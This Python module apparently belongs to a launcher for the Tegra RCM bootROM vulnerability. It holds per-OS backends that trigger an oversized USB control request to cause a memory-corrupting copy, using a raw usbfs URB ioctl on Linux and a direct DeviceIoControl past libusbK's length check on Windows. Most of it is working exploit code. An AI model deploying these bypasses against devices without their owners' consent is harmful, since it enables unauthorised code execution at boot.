import ctypes
import platform
import os
from abc import ABC

class HaxBackend(ABC):
    """
    Base class for backends for the TegraRCM vuln.
    """

    # USB constants used
    STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT = 0x82
    STANDARD_REQUEST_DEVICE_TO_HOST   = 0x80
    GET_DESCRIPTOR    = 0x6
    GET_CONFIGURATION = 0x8

    # Interface requests
    GET_STATUS        = 0x0

    # List of OSs this class supports.
    SUPPORTED_SYSTEMS = []

    def __init__(self, skip_checks=False):
        """ Sets up the backend for the given device. """
        self.skip_checks = skip_checks


    def print_warnings(self):
        """ Print any warnings necessary for the given backend. """
        pass


    def trigger_vulnerability(self, length):
        """
        Triggers the actual controlled memcpy.
        The actual trigger needs to be executed carefully, as different host OSs
        require us to ask for our invalid control request differently.
        """
        raise NotImplementedError("Trying to use an abstract backend rather than an instance of the proper subclass!")


    @classmethod
    def supported(cls, system_override=None):
        """ Returns true iff the given backend is supported on this platform. """

        # If we have a SYSTEM_OVERRIDE, use it.
        if system_override:
            system = system_override
        else:
            system = platform.system()

        return system in cls.SUPPORTED_SYSTEMS


    @classmethod
    def create_appropriate_backend(cls, system_override=None, skip_checks=False):
        """ Creates a backend object appropriate for the current OS. """

        # Search for a supportive backend, and try to create one.
        for subclass in cls.__subclasses__():
            if subclass.supported(system_override):
                return subclass(skip_checks=skip_checks)

        # ... if we couldn't, bail out.
        raise IOError("No backend to trigger the vulnerability-- it's likely we don't support your OS!")


    def read(self, length):
        """ Reads data from the RCM protocol endpoint. """
        return bytes(self.dev.read(0x81, length, 1000))


    def write_single_buffer(self, data):
        """
        Writes a single RCM buffer, which should be 0x1000 long.
        The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
        If it's not, send a ZLP.
        """
        return self.dev.write(0x01, data, 1000)


    def find_device(self, vid=None, pid=None):
        """ Set and return the device to be used """

        import usb

        self.dev = usb.core.find(idVendor=vid, idProduct=pid)
        return self.dev


class MacOSBackend(HaxBackend):
    """
    Simple vulnerability trigger for macOS: we simply ask libusb to issue
    the broken control request, and it'll do it for us. :)

    We also support platforms with a hacked libusb and FreeBSD.
    """

    BACKEND_NAME = "macOS"
    SUPPORTED_SYSTEMS = ['Darwin', 'libusbhax', 'macos', 'FreeBSD']

    def trigger_vulnerability(self, length):

        # Triggering the vulnerability is simplest on macOS; we simply issue the control request as-is.
        return self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, self.GET_STATUS, 0, 0, length)



class LinuxBackend(HaxBackend):
    """
    More complex vulnerability trigger for Linux: we can't go through libusb,
    as it limits control requests to a single page size, the limitation expressed
    by the usbfs. More realistically, the usbfs seems fine with it, and we just
    need to work around libusb.
    """

    BACKEND_NAME = "Linux"
    SUPPORTED_SYSTEMS = ['Linux', 'linux']
    SUPPORTED_USB_CONTROLLERS = ['pci/drivers/xhci_hcd', 'platform/drivers/dwc_otg']

    SETUP_PACKET_SIZE = 8

    IOCTL_IOR   = 0x80000000
    IOCTL_TYPE  = ord('U')
    IOCTL_NR_SUBMIT_URB = 10

    URB_CONTROL_REQUEST = 2

    class SubmitURBIoctl(ctypes.Structure):
        _fields_ = [
            ('type',          ctypes.c_ubyte),
            ('endpoint',      ctypes.c_ubyte),
            ('status',        ctypes.c_int),
            ('flags',         ctypes.c_uint),
            ('buffer',        ctypes.c_void_p),
            ('buffer_length', ctypes.c_int),
            ('actual_length', ctypes.c_int),
            ('start_frame',   ctypes.c_int),
            ('stream_id',     ctypes.c_uint),
            ('error_count',   ctypes.c_int),
            ('signr',         ctypes.c_uint),
            ('usercontext',   ctypes.c_void_p),
        ]


    def print_warnings(self):
        """ Print any warnings necessary for the given backend. """
        print("\nImportant note: on desktop Linux systems, we currently require an XHCI host controller.")
        print("A good way to ensure you're likely using an XHCI backend is to plug your")
        print("device into a blue 'USB 3' port.\n")


    def trigger_vulnerability(self, length):
        """
        Submit the control request directly using the USBFS submit_urb
        ioctl, which issues the control request directly. This allows us
        to send our giant control request despite size limitations.
        """

        import os
        import fcntl

        # We only work for devices that are bound to a compatible HCD.
        self._validate_environment()

        # Figure out the USB device file we're going to use to issue the
        # control request.
        fd = os.open('/dev/bus/usb/{:0>3d}/{:0>3d}'.format(self.dev.bus, self.dev.address), os.O_RDWR)

        # Define the setup packet to be submitted.
        setup_packet = \
            int.to_bytes(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, 1, byteorder='little') + \
            int.to_bytes(self.GET_STATUS,                                  1, byteorder='little') + \
            int.to_bytes(0,                                                2, byteorder='little') + \
            int.to_bytes(0,                                                2, byteorder='little') + \
            int.to_bytes(length,                                           2, byteorder='little')

        # Create a buffer to hold the result.
        buffer_size = self.SETUP_PACKET_SIZE + length
        buffer = ctypes.create_string_buffer(setup_packet, buffer_size)

        # Define the data structure used to issue the control request URB.
        request = self.SubmitURBIoctl()
        request.type          = self.URB_CONTROL_REQUEST
        request.endpoint      = 0
        request.buffer        = ctypes.addressof(buffer)
        request.buffer_length = buffer_size

        # Manually submit an URB to the kernel, so it issues our 'evil' control request.
        ioctl_number = (self.IOCTL_IOR | ctypes.sizeof(request) << 16 | ord('U') << 8 | self.IOCTL_NR_SUBMIT_URB)
        fcntl.ioctl(fd, ioctl_number, request, True)

        # Close our newly created fd.
        os.close(fd)

        # The other modules raise an IOError when the control request fails to complete. We don't fail out (as we don't bother
        # reading back), so we'll simulate the same behavior as the others.
        raise IOError("Raising an error to match the others!")


    def _validate_environment(self):
        """
        We can only inject giant control requests on devices that are backed
        by certain usb controllers-- typically, the xhci_hcd on most PCs.
        """

        from glob import glob

        # If we're overriding checks, never fail out.
        if self.skip_checks:
            print("skipping checks")
            return

        # Search each device bound to the xhci_hcd driver for the active device...
        for hci_name in self.SUPPORTED_USB_CONTROLLERS:
            for path in glob("/sys/bus/{}/*/usb*".format(hci_name)):
                if self._node_matches_our_device(path):
                    return

        raise ValueError("This device needs to be on a supported backend. Usually that means plugged into a blue/USB 3.0 port!\nBailing out.")


    def _node_matches_our_device(self, path):
        """
        Checks to see if the given sysfs node matches our given device.
        Can be used to check if an xhci_hcd controller subnode reflects a given device.,
        """

        # If this isn't a valid USB device node, it's not what we're looking for.
        if not os.path.isfile(path + "/busnum"):
            return False

        # We assume that a whole _bus_ is associated with a host controller driver, so we
        # only check for a matching bus ID.
        if self.dev.bus != self._read_num_file(path + "/busnum"):
            return False

        # If all of our checks passed, this is our device.
        return True


    def _read_num_file(self, path):
        """
        Reads a numeric value from a sysfs file that contains only a number.
        """

        with open(path, 'r') as f:
            raw = f.read()
            return int(raw)

class WindowsBackend(HaxBackend):
    """
    Use libusbK for most of it, and use the handle libusbK gets for us to call kernel32's DeviceIoControl
    """

    BACKEND_NAME = "Windows"
    SUPPORTED_SYSTEMS = ["Windows"]

    # Windows and libusbK specific constants
    WINDOWS_FILE_DEVICE_UNKNOWN = 0x00000022
    LIBUSBK_FUNCTION_CODE_GET_STATUS = 0x807
    WINDOWS_METHOD_BUFFERED = 0
    WINDOWS_FILE_ANY_ACCESS = 0

    RAW_REQUEST_STRUCT_SIZE = 24 # 24 is how big the struct is, just trust me
    TO_ENDPOINT = 2

    # Yoinked (with love) from Windows' CTL_CODE macro
    def win_ctrl_code(self, DeviceType, Function, Method, Access):
        """ Return a control code for use with DeviceIoControl() """
        return ((DeviceType) << 16 | ((Access) << 14) | ((Function)) << 2 | (Method))

    def __init__(self, skip_checks):
        import libusbK
        self.libk = libusbK
        # Grab libusbK
        self.lib = ctypes.cdll.libusbK


    def find_device(self, Vid, Pid):
        """
        Windows version of this function
        Its return isn't actually significant, but it needs to be not None
        """

        # Get a list of devices to use later
        device_list = self.libk.KLST_HANDLE()
        device_info = ctypes.pointer(self.libk.KLST_DEV_INFO())
        ret = self.lib.LstK_Init(ctypes.byref(device_list), 0)

        if ret == 0:
            raise ctypes.WinError()

        # Get info for a device with that vendor ID and product ID
        device_info = ctypes.pointer(self.libk.KLST_DEV_INFO())
        ret = self.lib.LstK_FindByVidPid(device_list, Vid, Pid, ctypes.byref(device_info))
        self.lib.LstK_Free(ctypes.byref(device_list))
        if device_info is None or ret == 0:
            return None

        # Populate function pointers for use with the driver our device uses (which should be libusbK)
        self.dev = self.libk.KUSB_DRIVER_API()
        ret = self.lib.LibK_LoadDriverAPI(ctypes.byref(self.dev), device_info.contents.DriverID)
        if ret == 0:
            raise ctypes.WinError()

        # Initialize the driver for use with our device
        self.handle = self.libk.KUSB_HANDLE(None)
        ret = self.dev.Init(ctypes.byref(self.handle), device_info)
        if ret == 0:
            raise self.libk.WinError()

        return self.dev


    def read(self, length):
        """ Read using libusbK """
        # Create the buffer to store what we read
        buffer = ctypes.create_string_buffer(length)

        len_transferred = ctypes.c_uint(0)

        # Call libusbK's ReadPipe using our specially-crafted function pointer and the opaque device handle
        ret = self.dev.ReadPipe(self.handle, ctypes.c_ubyte(0x81), ctypes.addressof(buffer), ctypes.c_uint(length), ctypes.byref(len_transferred), None)

        if ret == 0:
            raise ctypes.WinError()

        return buffer.raw

    def write_single_buffer(self, data):
        """ Write using libusbK """
        # Copy construct to a bytearray so we Know™ what type it is
        buffer = bytearray(data)

        # Convert wrap the data for use with ctypes
        cbuffer = (ctypes.c_ubyte * len(buffer))(*buffer)

        len_transferred = ctypes.c_uint(0)

        # Call libusbK's WritePipe using our specially-crafted function pointer and the opaque device handle
        ret = self.dev.WritePipe(self.handle, ctypes.c_ubyte(0x01), cbuffer, len(data), ctypes.byref(len_transferred), None)
        if ret == 0:
            raise ctypes.WinError()

    def ioctl(self, driver_handle: ctypes.c_void_p, ioctl_code: ctypes.c_ulong, input_bytes: ctypes.c_void_p, input_bytes_count: ctypes.c_size_t, output_bytes: ctypes.c_void_p, output_bytes_count: ctypes.c_size_t):
        """ Wrapper for DeviceIoControl """
        overlapped = self.libk.OVERLAPPED()
        ctypes.memset(ctypes.addressof(overlapped), 0, ctypes.sizeof(overlapped))

        ret = ctypes.windll.kernel32.DeviceIoControl(driver_handle, ioctl_code, input_bytes, input_bytes_count, output_bytes, output_bytes_count, None, ctypes.byref(overlapped))

        # We expect this to error, which matches the others ^_^
        if ret == False:
            raise ctypes.WinError()

    def trigger_vulnerability(self, length):
        """
        Go over libusbK's head and get the master handle it's been using internally
        and perform a direct DeviceIoControl call to the kernel to skip the length check
        """
        # self.handle is KUSB_HANDLE, cast to KUSB_HANDLE_INTERNAL to transparent-ize it
        internal = ctypes.cast(self.handle, ctypes.POINTER(self.libk.KUSB_HANDLE_INTERNAL))

        # Get the handle libusbK has been secretly using in its ioctl calls this whole time
        master_handle = internal.contents.Device.contents.MasterDeviceHandle

        if master_handle is None or master_handle == self.libk.INVALID_HANDLE_VALUE:
            raise ValueError("Failed to initialize master handle")

        # the raw request struct is pretty annoying, so I'm just going to allocate enough memory and set the few fields I need
        raw_request = ctypes.create_string_buffer(self.RAW_REQUEST_STRUCT_SIZE)

        # set timeout to 1000 ms, timeout offset is 0 (since it's the first member), and it's an unsigned int
        timeout_p = ctypes.cast(raw_request, ctypes.POINTER(ctypes.c_uint))
        timeout_p.contents = ctypes.c_ulong(1000) # milliseconds

        status_p = ctypes.cast(ctypes.byref(raw_request, 4), ctypes.POINTER(self.libk.status_t))
        status_p.contents.index = self.GET_STATUS
        status_p.contents.recipient = self.TO_ENDPOINT

        buffer = ctypes.create_string_buffer(length)

        code = self.win_ctrl_code(self.WINDOWS_FILE_DEVICE_UNKNOWN, self.LIBUSBK_FUNCTION_CODE_GET_STATUS, self.WINDOWS_METHOD_BUFFERED, self.WINDOWS_FILE_ANY_ACCESS)
        ret = self.ioctl(master_handle, ctypes.c_ulong(code), raw_request, ctypes.c_size_t(24), buffer, ctypes.c_size_t(length))

        if ret == False:
            raise ctypes.WinError()
